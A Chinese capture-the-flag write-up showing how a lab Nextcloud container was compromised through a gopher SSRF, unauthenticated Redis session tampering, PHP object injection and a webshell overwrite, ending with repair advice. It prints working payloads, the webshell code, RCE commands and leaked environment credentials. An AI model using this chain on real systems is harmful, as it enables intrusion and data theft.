# 强网杯 2026 · Web · ezphp Writeup

> 题目：ezphp，how 2shell???
> 分值：100 · 环境：**Nextcloud 34.0.3 + PHP 8.5.12 (mod_php) + Apache 2.4.69 + Redis 8.0.2**
> **最终 Flag：`flag{9329336d-5e61-4879-a890-cc7786beb711}`**（`/flag`，同时存在于环境变量 `ICQ_FLAG`）

---

## 0. 一句话总结

题面给的 `/flag.php` 是一个**双层陷阱**：它本身能通过漏掉 `gopher` 协议的 SSRF 读到 `flag{You_are_so_smart_8080}` —— 这是作者埋的**假 flag**（提交必错）。真正的入口是这条 SSRF 打通了内网 **无认证的 Redis**，而 PHP 的 `session.save_handler=redis`，于是：

```
SSRF(gopher) → Redis 里的 PHP session → 反序列化对象注入
   → Guzzle FileCookieJar::__destruct 任意文件写
   → 覆盖一个已存在的 PHP 入口为 webshell → RCE(www-data) → /flag
```

---

## 1. 信息收集

```
GET /                     -> 302 /login          (Nextcloud)
GET /status.php           -> {"versionstring":"34.0.3", ...}
X-Powered-By: PHP/8.5.12
Server: Apache/2.4.69 (Debian)
```

目录探测在站点根发现非 Nextcloud 自带文件 `/flag.php`（8316 字节），不带参数访问会 `highlight_file(__FILE__)` 直接泄源码（**附件 flag.php 即由其还原**）。

---

## 2. 第二层：SSRF 拿到的其实是假 flag

`/flag.php` 逻辑（精简）：

```php
if (in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1','::1'], true)) {
    foreach (['HTTP_X_FORWARDED_FOR','HTTP_CLIENT_IP','HTTP_X_REAL_IP','HTTP_FORWARDED'] as $h)
        if (!empty($_SERVER[$h])) exit('Hacker?');
    if (!preg_match('#^qwb2026#i', $_SERVER['HTTP_USER_AGENT'] ?? '')) exit('Hacker?');
    echo trim(file_get_contents('/opt/ctf/internal/flag.txt'));   // 假 flag
    exit;
}
highlight_file(__FILE__);

// 否则是 SSRF
if (preg_match('#(file|dict|ftp|tftp|sftp|ssh|smb|telnet|ldapi|phar|expect|zlib|glob|data|zip):/+#i', $url)) die('Hacker?');
if (strpos($url,'\\') !== false || substr_count($url,'@') > 1) die('Hacker?');
$host = strtolower(trim((string)parse_url($url, PHP_URL_HOST), '[]'));
if ($host !== '127.0.0.1' && $host !== '::1' && $host !== 'localhost') die('Hacker?');

curl_setopt($ch, CURLOPT_USERAGENT, 'internal-preview/1.0');   // UA 写死
curl_exec($ch);                                                 // 无 RETURNTRANSFER ⇒ 回显
```

矛盾点：读 flag 必须来自 `127.0.0.1` 且 `UA` 以 `qwb2026` 开头，但 SSRF 的 UA 被写死成 `internal-preview/1.0`。

**突破口：协议黑名单里没有 `gopher`。** libcurl 的 gopher 会把 `/_` 之后的百分号编码解码后原样发出，等于可以**手写整个 HTTP 报文**：

```bash
curl -sk -G "$T/flag.php" --data-urlencode \
 'url=gopher://127.0.0.1:80/_GET%20/flag.php%20HTTP/1.0%0d%0aHost:%20localhost%0d%0aUser-Agent:%20qwb2026%0d%0a%0d%0a'
```

（编码层级：query 一次 → `$_GET` 解码一次 → libcurl 对 gopher 路径再解码一次）

```
flag{You_are_so_smart_8080}
```

> **提交报错 —— 这是作者埋的诱饵**（`/opt/ctf/internal/flag.txt` 就是写着嘲讽话的假文件）。
> 本题使用动态 flag，真 flag 在 `/flag`（root 只读，需要 shell 才能读）。

---

## 3. 内网探测：时间侧信道发现 Redis

协议走不通，就看这台机器上还有什么。SSRF 只能打 `127.0.0.1`，于是用 gopher 做端口探测。
**注意**：端口关闭时 curl 立刻报错（~0.15s），服务静默时会一直等到 `CURLOPT_TIMEOUT=5`，用耗时即可区分：

```
port 80    t=0.27/0.19  RESP:HTTP/1.1 302 Found ...
port 6379  t=5.31/5.24  RESP:-ERR wrong number of arguments for 'get' command   <-- Redis!
其余端口    t≈0.15~0.4   (拒绝连接)
```

`::1` 也扫了一遍，同样只有 80。

Redis 8.0.2，**无认证**，但从 `INFO` 可看出作者做了加固：

```
executable:/var/www/html/redis-server
```

| 命令 | 结果 |
|---|---|
| `PING` / `INFO` / `GET` / `SET` / `EVAL` | 可用 |
| `CONFIG` / `DEBUG` / `KEYS` / `SCAN` / `RANDOMKEY` | `unknown command`（被 rename 掉） |
| `MODULE LOAD` | `MODULE command not allowed` |

即：**经典的 `CONFIG SET dir/dbfilename` 写马、`KEYS *` 枚举全部被封**。

---

## 4. 关键点：PHP 的 session 就存在 Redis 里

`INFO` 里那条线索 `session.save_handler` 需要 shell 才能看到，但**直接猜 key 就通了**：向 Redis 取我们自己的会话：

```
GET PHPREDIS_SESSION:<cookie里的32位十六进制>
→ encrypted_session_data|s:388:"def0e970da1f..."
```

两点收获：

1. `session.save_handler = redis`，`session.serialize_handler = php`（`<key>|<serialized>` 格式）；
2. **我们可以随意改写这个 key** ⇒ `session_start()` 会用 `php` 反序列化器解析我们的内容 ⇒ **任意对象注入**（不需要 CVE-2026-115560 那套 handler 错位）。

---

## 5. 玩具链：Guzzle `FileCookieJar` 任意文件写

Nextcloud 内置 Guzzle（`OC\Http\Client`），先做实验确认类可用（注入一个空对象后读回 session，对象被原样序列化回来即证明类存在且反序列化成功）：

```
pwn|O:31:"GuzzleHttp\Cookie\FileCookieJar":0:{}
→ 回显 cookies/strictMode/filename/storeSessionCookies 四个私有属性
```

`FileCookieJar::__destruct()` → `save($this->filename)` → `file_put_contents()`，内容为 cookie 的 JSON。于是把 PHP 代码放进 `SetCookie::$data['Value']`。

### 5.1 坑一：NUL 与反斜杠过不去

私有属性名形如 `\0GuzzleHttp\Cookie\FileCookieJar\0filename`，而 URL 里**反斜杠被 `/flag.php` 直接拦截**、NUL 也会截断 curl 的路径。两个办法叠加：

* 传输层：先编码成 `%5C` / `%00`（PHP 看到的是字面量，libcurl 会再解码回原始字节）；
* 序列化层：属性名改用 `S:` 转义格式 —— `S:41:"\00GuzzleHttp\5cCookie\5cFileCookieJar\00filename";`（`S` 的长度按**解码后**字节数算）。

### 5.2 坑二：Guzzle 默认不持久化 session cookie

`FileCookieJar::save()` 里有一句：

```php
if (CookieJar::shouldPersist($cookie, $this->storeSessionCookies)) {
    $json[] = $cookie->toArray();
}
// shouldPersist: if ($cookie->getExpires() || $allowSessionCookies) { if (!$cookie->getDiscard()) return true; }
```

我们的 SetCookie 没有 `Expires`，`storeSessionCookies` 又是 null ⇒ 写出空数组 `[]`。
**必须加一个属性：`\0...\0storeSessionCookies` = `b:1;`**，之后写入结果变成：

```json
[{"Name":"a","Value":"<?php system($_GET[0]);?>","HostOnly":false}]
```

PHP 执行该文件时会把 JSON 当 HTML 输出，然后执行 `<?php ... ?>` 里的代码。

### 5.3 写哪里

容器里 `/var/www/html` 属主是 `www-data`，**文件可写、但不能新建**（目录 755）。所以只能**覆盖已存在的 PHP 文件**。选 `ocs/v1.php`（OCS 入口，覆盖不影响我们后续操作）：

```php
<?php if(isset($_GET[0])){system($_GET[0]);} ?>
```

```
GET /ocs/v1.php?0=id
→ [{"Name":"a","Value":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","HostOnly":false}]
```

**RCE 到手。**

---

## 6. 拿真 flag

```bash
cat /flag
# flag{9329336d-5e61-4879-a890-cc7786beb711}

env | grep -i flag
# ICQ_FLAG=flag{9329336d-5e61-4879-a890-cc7786beb711}
# NEXTCLOUD_ADMIN_PASSWORD=NcCtf-Adm1n-DoNotShare
# CTF_PLAYER_USER=player / CTF_PLAYER_PASSWORD=Player-Pr3view-2026

cat /opt/ctf/internal/flag.txt
# flag{You_are_so_smart_8080}      <-- 假 flag
```

---

## 7. 修复建议（出题/防守视角）

1. **SSRF 白名单**：curl 里用 `CURLOPT_PROTOCOLS` 只留 `http/https`，不要靠正则黑名单（必然漏）；
2. **内网服务加固**：Redis 必须 `requirepass` + `bind 127.0.0.1` 之外还要考虑同机 SSRF；把 `CONFIG/DEBUG/KEYS` 改名是好事，但 `SET` 仍在就能打 session；
3. **不要把 PHP session 放进可写 Redis**：session 内容可被直接改写 ⇒ 等价于一个"处处存在的 unserialize 入口"；
4. **应用层**：升级/移除有 `__destruct` 写文件语义的库不可行，应保证 webroot 目录权限收敛到"文件也不可写"，或至少不把 `ocs/v1.php` 这类入口置于可写目录。

---

## 8. 附件说明

| 文件 | 说明 |
|---|---|
| `WP.md` | 本报告 |
| `exp_full.py` | **一键利用脚本**（SSRF → Redis → session 注入 → 写马 → 执行命令） |
| `flag.php` | 从 `/flag.php` 的 `highlight_file` 输出还原的源码 |
| `flag.txt` | 真实 flag |
| `exp.sh` | 仅第一阶段（gopher 伪造 UA，拿到**假** flag，留作对照） |

`exp_full.py` 用法：

```bash
python exp_full.py https://eci-xxxxxxxx.cloudeci1.ichunqiu.com "id; cat /flag"
```

> 注：利用过程会覆盖 `/var/www/html/ocs/v1.php`（已还原 `robots.txt`、`favicon.ico`，`ocs/v1.php` 原文件无备份故保留为 webshell）。容器用完即弃，不影响计分。
